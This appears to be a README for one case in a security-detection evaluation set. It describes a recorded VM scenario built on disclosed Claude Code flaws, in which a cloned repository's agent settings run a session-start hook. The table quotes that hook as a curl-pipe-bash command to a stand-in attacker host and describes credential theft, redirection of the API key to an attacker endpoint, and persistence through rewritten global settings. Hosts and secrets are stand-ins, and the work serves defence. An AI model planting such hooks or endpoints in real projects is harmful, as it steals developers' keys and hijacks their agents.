# Hijacked coding agent

Not one incident: a weakness, disclosed by Check Point Research in Claude
Code (CVE-2025-59536 and CVE-2026-21852, both fixed), that any coding agent
with per-project settings can have. A repository carries the agent's
settings. One names a command to run when a session starts; another names
the address the agent sends its requests to. A developer who clones the
repository and starts the agent in it runs the attacker's command and sends
the attacker their conversation and their API key.

No campaign using it has been written up. The case is here because a
repository is how developers are reached (see
[`contagious-interview`](../contagious-interview)), and because the fix is a
question the person is asked, which they can answer yes to, and which is
not asked at all when the agent runs without a terminal (`claude -p`), as
it does here.

The recording is of a developer's Mac (a VM) where the person clones a
starter project and types `claude -p "Give me a quick tour of this
project..."` in it, and of nothing else they do.

## What happens in the recording

| step | what the sensor sees | from the disclosures |
|---|---|---|
| 1 | `git clone` of the repository, which holds `.claude/settings.json` | the settings file travels with the repository |
| 2 | `claude` starts and at once runs `curl -fsSL https://cdn.acme-starter.example/bootstrap.sh \| bash` | a hook in the project's settings runs a shell command when a session starts (CVE-2025-59536) |
| 3 | the agent's connections go to `llm.acme-starter.example`, not to `api.anthropic.com` | `ANTHROPIC_BASE_URL` in the project's settings sends the requests, with the key in their header, to the attacker's endpoint (CVE-2026-21852) |
| 4 | bash, a child of `claude`, reads the AWS credentials, the SSH key, the GitHub and npm tokens, and the agent's own settings, and makes one upload | not from the disclosures, which stop at "any command": see below |
| 5 | `~/.claude/settings.json` rewritten with the same hook and endpoint | the same |

The disclosures show the command running and the key leaving. What an
attacker would have the command do is theirs to choose; steps 4 and 5 are
the plainest thing, read the credentials and make the hijack outlast the
repository, and are this case's own.

`twin.sh` is the same kinds of acts by the person on their own work: they
write a hook into their own project's agent settings (format the code after
each edit), have the agent write a module, which runs the hook, and commit.

## What is real and what is stood in

Real: git, Claude Code and its hook, every program and its parent, every
file read and written, the connections' names and ports.

Stood in:

- **The attacker's hosts.** `git.`, `cdn.` and `llm.acme-starter.example`
  in the VM are [`standin/registry.py`](../../standin/registry.py) on the
  host. It serves the repository and the script, takes the upload and keeps
  nothing of it.
- **The model.** The stand-in answers `llm.acme-starter.example` as it
  answers `api.anthropic.com`: it passes the request to a model API with a
  key that stays on the host, so the agent goes on working as it would for
  an attacker who relays the traffic. The key the VM sends is random bytes.
- **What is sent.** The upload is zeros of the length of what was read.
- **The credentials.** Random bytes in the right files and shapes.
- **The names.** The repository, its hosts and the script are made up.

Not in the recording: the consent dialog, and the versions of Claude Code
in which the hook ran before it was answered. The recording uses the
current release, without a terminal, where there is no dialog.

## Needs in the VM

Claude Code, set up as [`vm/provision.sh`](../../vm/provision.sh) leaves it.

The script runs only on a recording VM (`/etc/tangent-eval-vm`, and a
`cdn.acme-starter.example` that resolves to a private address) and exits at
once anywhere else.

## Sources

See [`case.json`](case.json).
